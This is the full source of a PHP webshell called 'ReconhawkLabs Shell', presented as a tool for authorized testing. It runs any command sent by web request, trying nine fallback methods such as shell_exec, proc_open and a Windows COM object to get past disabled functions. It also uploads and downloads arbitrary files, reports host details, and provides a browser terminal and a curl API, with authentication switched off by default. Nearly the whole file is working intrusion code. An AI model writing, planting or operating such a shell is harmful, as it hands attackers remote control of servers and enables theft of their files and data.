<?php
/**
 * Multi-Method PHP Webshell - Cross-Platform Edition
 * For authorized security testing only
 * Features: Multiple execution methods, file operations, web interface + API
 * Supports: Windows (cmd.exe, PowerShell, COM) and Linux (bash, sh)
 * Auto-detects OS and uses appropriate execution methods
 */

// Configuration
define('AUTH_ENABLED', false); // Set to true and configure password below
define('AUTH_PASSWORD', 'changeme'); // Change this for production use

// Authentication check
if (AUTH_ENABLED && (!isset($_POST['password']) || $_POST['password'] !== AUTH_PASSWORD)) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        http_response_code(401);
        die(json_encode(['error' => 'Authentication failed']));
    }
}

// Handle file download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_readable($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        die('File not found or not readable');
    }
}

// Handle file upload
if (isset($_FILES['upload_file'])) {
    $upload_dir = isset($_POST['upload_dir']) ? $_POST['upload_dir'] : getcwd();
    $target_file = rtrim($upload_dir, '/') . '/' . basename($_FILES['upload_file']['name']);

    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
        $result = ['success' => true, 'message' => 'File uploaded successfully', 'path' => $target_file];
    } else {
        $result = ['success' => false, 'message' => 'Upload failed'];
    }

    if (isset($_POST['ajax'])) {
        header('Content-Type: application/json');
        echo json_encode($result);
        exit;
    }
}

// Detect operating system
function isWindows() {
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

// Command execution with multiple fallback methods (cross-platform)
function executeCommand($cmd) {
    $output = '';
    $is_windows = isWindows();

    // Method 1: shell_exec (works on both Windows and Linux)
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
        if ($output !== null && trim($output) !== '') {
            return ['output' => $output, 'method' => 'shell_exec', 'os' => $is_windows ? 'Windows' : 'Linux'];
        }
    }

    // Method 2: exec (works on both platforms)
    if (function_exists('exec')) {
        $output_array = [];
        $return_var = 0;
        exec($cmd . ' 2>&1', $output_array, $return_var);
        if (!empty($output_array)) {
            return ['output' => implode("\n", $output_array), 'method' => 'exec', 'os' => $is_windows ? 'Windows' : 'Linux'];
        }
    }

    // Method 3: system (works on both platforms)
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1', $return_var);
        $output = ob_get_clean();
        if ($output !== false && trim($output) !== '') {
            return ['output' => $output, 'method' => 'system', 'os' => $is_windows ? 'Windows' : 'Linux'];
        }
    }

    // Method 4: passthru (works on both platforms)
    if (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1', $return_var);
        $output = ob_get_clean();
        if ($output !== false && trim($output) !== '') {
            return ['output' => $output, 'method' => 'passthru', 'os' => $is_windows ? 'Windows' : 'Linux'];
        }
    }

    // Method 5: popen (works on both platforms)
    if (function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            if (trim($output) !== '') {
                return ['output' => $output, 'method' => 'popen', 'os' => $is_windows ? 'Windows' : 'Linux'];
            }
        }
    }

    // Method 6: proc_open (works on both platforms, most reliable)
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];

        // On Windows, we need to handle the command differently for proper execution
        if ($is_windows) {
            // Windows: Use cmd.exe to properly handle commands
            $process = proc_open('cmd.exe /c ' . $cmd, $descriptors, $pipes);
        } else {
            // Linux: Execute directly
            $process = proc_open($cmd, $descriptors, $pipes);
        }

        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (trim($output . $errors) !== '') {
                return ['output' => $output . $errors, 'method' => 'proc_open', 'os' => $is_windows ? 'Windows' : 'Linux'];
            }
        }
    }

    // Method 7: COM object (Windows only - uses WScript.Shell)
    if ($is_windows && class_exists('COM')) {
        try {
            $wsh = new COM('WScript.Shell');
            $exec = $wsh->exec('cmd.exe /c ' . $cmd . ' 2>&1');
            $output = $exec->StdOut->ReadAll();
            $errors = $exec->StdErr->ReadAll();
            if (trim($output . $errors) !== '') {
                return ['output' => $output . $errors, 'method' => 'COM(WScript.Shell)', 'os' => 'Windows'];
            }
        } catch (Exception $e) {
            // COM failed, continue to next method
        }
    }

    // Method 8: backtick operator (works on both platforms)
    if (!ini_get('safe_mode')) {
        $output = `$cmd 2>&1`;
        if ($output !== null && trim($output) !== '') {
            return ['output' => $output, 'method' => 'backtick', 'os' => $is_windows ? 'Windows' : 'Linux'];
        }
    }

    // Method 9: Windows-specific fallback using popen with cmd.exe
    if ($is_windows && function_exists('popen')) {
        $handle = popen('cmd.exe /c ' . $cmd . ' 2>&1', 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            if (trim($output) !== '') {
                return ['output' => $output, 'method' => 'popen+cmd', 'os' => 'Windows'];
            }
        }
    }

    return ['output' => 'All execution methods failed or are disabled', 'method' => 'none', 'os' => $is_windows ? 'Windows' : 'Linux'];
}

// API endpoint for POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $result = executeCommand($cmd);

    header('Content-Type: application/json');
    echo json_encode([
        'command' => $cmd,
        'output' => $result['output'],
        'method' => $result['method'],
        'os' => $result['os'],
        'cwd' => getcwd(),
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    exit;
}

// Get system information
function getSystemInfo() {
    return [
        'hostname' => gethostname(),
        'os' => PHP_OS,
        'php_version' => phpversion(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'current_user' => get_current_user(),
        'uid' => getmyuid(),
        'gid' => getmygid(),
        'cwd' => getcwd(),
        'disabled_functions' => ini_get('disable_functions') ?: 'None',
        'safe_mode' => ini_get('safe_mode') ? 'On' : 'Off'
    ];
}

$sysinfo = getSystemInfo();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReconhawkLabs Shell</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 10px;
            font-size: 13px;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
        }

        h1 {
            color: #00ff00;
            margin-bottom: 8px;
            font-size: 18px;
            letter-spacing: 1px;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 10px;
            padding: 8px;
            background: #000;
            border: 1px solid #00ff00;
            font-size: 12px;
        }

        .info-item {
            display: flex;
            gap: 10px;
        }

        .info-label {
            color: #ffffff;
            font-weight: bold;
        }

        .terminal-section {
            margin-bottom: 10px;
        }

        .section-title {
            color: #ffffff;
            margin-bottom: 5px;
            font-size: 14px;
            text-transform: uppercase;
        }

        .terminal {
            background: #000;
            border: 1px solid #00ff00;
            padding: 10px;
            height: 250px;
            overflow-y: auto;
            margin-bottom: 5px;
            font-size: 12px;
        }

        .terminal-output {
            white-space: pre-wrap;
            word-wrap: break-word;
            margin-bottom: 5px;
        }

        .command-line {
            color: #ffaa00;
        }

        .method-info {
            color: #888;
            font-size: 0.85em;
        }

        .input-group {
            display: flex;
            gap: 5px;
            margin-bottom: 10px;
        }

        input[type="text"] {
            flex: 1;
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 6px 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }

        input[type="text"]:focus {
            outline: none;
            border: 1px solid #ffffff;
        }

        button, .btn {
            background: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 6px 15px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            font-size: 13px;
        }

        button:hover, .btn:hover {
            background: #00ff00;
            color: #000;
        }

        .file-operations {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            margin-top: 10px;
        }

        .file-op-box {
            background: #000;
            border: 1px solid #00ff00;
            padding: 10px;
        }

        input[type="file"] {
            display: block;
            margin: 5px 0;
            color: #00ff00;
            font-size: 12px;
        }

        .api-docs {
            background: #000;
            border: 1px solid #00ff00;
            padding: 10px;
            margin-top: 10px;
        }

        .api-docs h3 {
            color: #ffffff;
            margin-bottom: 5px;
            font-size: 14px;
        }

        .api-docs p {
            font-size: 12px;
            margin: 3px 0;
        }

        .api-example {
            background: #000;
            padding: 5px;
            margin: 5px 0;
            overflow-x: auto;
            border-left: 2px solid #00ff00;
            padding-left: 10px;
        }

        .api-example code {
            color: #ffaa00;
            font-size: 11px;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #000;
        }

        ::-webkit-scrollbar-thumb {
            background: #00ff00;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #00aa00;
        }

        .status-message {
            padding: 5px;
            margin: 5px 0;
            display: none;
            font-size: 12px;
        }

        .status-success {
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
        }

        .status-error {
            background: #000;
            border: 1px solid #ff0000;
            color: #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ ReconhawkLabs ] - Multi-Method Shell</h1>

        <div class="info-grid">
            <div class="info-item">
                <span class="info-label">Hostname:</span>
                <span><?php echo htmlspecialchars($sysinfo['hostname']); ?></span>
            </div>
            <div class="info-item">
                <span class="info-label">OS:</span>
                <span><?php echo htmlspecialchars($sysinfo['os']); ?></span>
            </div>
            <div class="info-item">
                <span class="info-label">PHP:</span>
                <span><?php echo htmlspecialchars($sysinfo['php_version']); ?></span>
            </div>
            <div class="info-item">
                <span class="info-label">User:</span>
                <span><?php echo htmlspecialchars($sysinfo['current_user']); ?> (<?php echo $sysinfo['uid']; ?>:<?php echo $sysinfo['gid']; ?>)</span>
            </div>
            <div class="info-item">
                <span class="info-label">CWD:</span>
                <span><?php echo htmlspecialchars($sysinfo['cwd']); ?></span>
            </div>
            <div class="info-item">
                <span class="info-label">Server:</span>
                <span><?php echo htmlspecialchars($sysinfo['server_software']); ?></span>
            </div>
        </div>

        <div class="terminal-section">
            <h2 class="section-title">[ Command Terminal ]</h2>
            <div id="terminal" class="terminal"></div>
            <div class="input-group">
                <input type="text" id="cmdInput" placeholder="Enter command..." autofocus>
                <button onclick="executeCmd()">Execute</button>
                <button onclick="clearTerminal()">Clear</button>
            </div>
        </div>

        <div class="file-operations">
            <div class="file-op-box">
                <h2 class="section-title">[ Upload File ]</h2>
                <form id="uploadForm" enctype="multipart/form-data">
                    <input type="file" name="upload_file" id="uploadFile" required>
                    <input type="text" name="upload_dir" placeholder="Upload directory (default: current)" style="width: 100%; margin: 5px 0;">
                    <input type="hidden" name="ajax" value="1">
                    <?php if (AUTH_ENABLED): ?>
                    <input type="hidden" name="password" value="">
                    <?php endif; ?>
                    <button type="submit">Upload</button>
                </form>
                <div id="uploadStatus" class="status-message"></div>
            </div>

            <div class="file-op-box">
                <h2 class="section-title">[ Download File ]</h2>
                <input type="text" id="downloadPath" placeholder="Enter file path..." style="width: 100%; margin: 5px 0;">
                <button onclick="downloadFile()">Download</button>
                <div id="downloadStatus" class="status-message"></div>
            </div>

            <div class="file-op-box">
                <h2 class="section-title">[ API Documentation ]</h2>
                <p>POST command:</p>
                <div class="api-example">
                    <code>curl -X POST [URL] -d "cmd=whoami"</code>
                </div>
                <p>With auth:</p>
                <div class="api-example">
                    <code>-d "cmd=ls&password=changeme"</code>
                </div>
                <p style="margin-top: 5px;">Returns: JSON (output, method, os, cwd, timestamp)</p>
            </div>
        </div>
    </div>

    <script>
        const terminal = document.getElementById('terminal');
        const cmdInput = document.getElementById('cmdInput');
        let commandHistory = [];
        let historyIndex = -1;

        // Execute command on Enter key
        cmdInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                executeCmd();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    cmdInput.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    cmdInput.value = commandHistory[historyIndex];
                } else if (historyIndex === 0) {
                    historyIndex = -1;
                    cmdInput.value = '';
                }
            }
        });

        async function executeCmd() {
            const cmd = cmdInput.value.trim();
            if (!cmd) return;

            // Add to history
            commandHistory.unshift(cmd);
            historyIndex = -1;

            // Display command
            const cmdLine = document.createElement('div');
            cmdLine.className = 'command-line';
            cmdLine.textContent = '$ ' + cmd;
            terminal.appendChild(cmdLine);

            // Clear input
            cmdInput.value = '';

            // Execute command
            try {
                const formData = new FormData();
                formData.append('cmd', cmd);
                <?php if (AUTH_ENABLED): ?>
                formData.append('password', '<?php echo AUTH_PASSWORD; ?>');
                <?php endif; ?>

                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                // Display output
                const output = document.createElement('div');
                output.className = 'terminal-output';
                output.textContent = result.output || '(no output)';
                terminal.appendChild(output);

                // Display method info
                const methodInfo = document.createElement('div');
                methodInfo.className = 'method-info';
                methodInfo.textContent = `[Method: ${result.method}] [OS: ${result.os}] [CWD: ${result.cwd}]`;
                terminal.appendChild(methodInfo);

            } catch (error) {
                const errorDiv = document.createElement('div');
                errorDiv.style.color = '#ff0000';
                errorDiv.textContent = 'Error: ' + error.message;
                terminal.appendChild(errorDiv);
            }

            // Scroll to bottom
            terminal.scrollTop = terminal.scrollHeight;
        }

        function clearTerminal() {
            terminal.innerHTML = '';
        }

        // File upload handling
        document.getElementById('uploadForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const formData = new FormData(this);
            const statusDiv = document.getElementById('uploadStatus');

            try {
                const response = await fetch(window.location.href, {
                    method: 'POST',
                    body: formData
                });

                const result = await response.json();

                statusDiv.className = 'status-message ' + (result.success ? 'status-success' : 'status-error');
                statusDiv.textContent = result.message + (result.path ? ' (' + result.path + ')' : '');
                statusDiv.style.display = 'block';

                if (result.success) {
                    document.getElementById('uploadFile').value = '';
                    setTimeout(() => statusDiv.style.display = 'none', 5000);
                }
            } catch (error) {
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Upload error: ' + error.message;
                statusDiv.style.display = 'block';
            }
        });

        // File download handling
        function downloadFile() {
            const path = document.getElementById('downloadPath').value.trim();
            const statusDiv = document.getElementById('downloadStatus');

            if (!path) {
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Please enter a file path';
                statusDiv.style.display = 'block';
                setTimeout(() => statusDiv.style.display = 'none', 3000);
                return;
            }

            window.location.href = window.location.pathname + '?download=' + encodeURIComponent(path);
        }

        // Auto-focus on input
        cmdInput.focus();
    </script>
</body>
</html>
